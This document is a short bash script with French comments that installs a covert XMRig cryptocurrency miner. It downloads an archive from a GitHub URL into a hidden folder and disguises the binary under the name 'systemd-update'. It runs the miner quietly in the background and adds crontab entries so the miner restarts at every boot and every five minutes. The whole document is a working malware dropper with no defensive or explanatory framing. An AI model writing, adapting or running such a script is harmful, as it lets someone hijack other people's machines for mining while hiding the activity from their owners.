#!/bin/bash

DIR="$HOME/.sysd"
BIN="systemd-update"
LOGFILE="$HOME/setup_debug.log"
ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"

# Créer le dossier caché
mkdir -p "$DIR" && cd "$DIR" || exit 1

# Activer le log complet dans un fichier
exec > >(tee "$LOGFILE") 2>&1

# Télécharger l'archive contenant le binaire et la config
curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz

# Extraire les fichiers
tar -xzf miner.tar.gz
chmod +x "$BIN"

# Préparer le log de XMRig
touch xmrig.log
chmod 666 xmrig.log
sleep 2

# Lancer le mineur en tâche de fond, discrètement
nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$DIR/xmrig.log" 2>&1 &

# Ajouter persistance au démarrage
(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -

# Vérification rapide
sleep 5
if [ -f "$DIR/xmrig.log" ]; then
  echo -e "\n[🧠] Dernières lignes du log XMRig :"
  tail -n 10 "$DIR/xmrig.log"
else
  echo "[!] Aucun fichier de log détecté. Le mineur a peut-être échoué."
fi
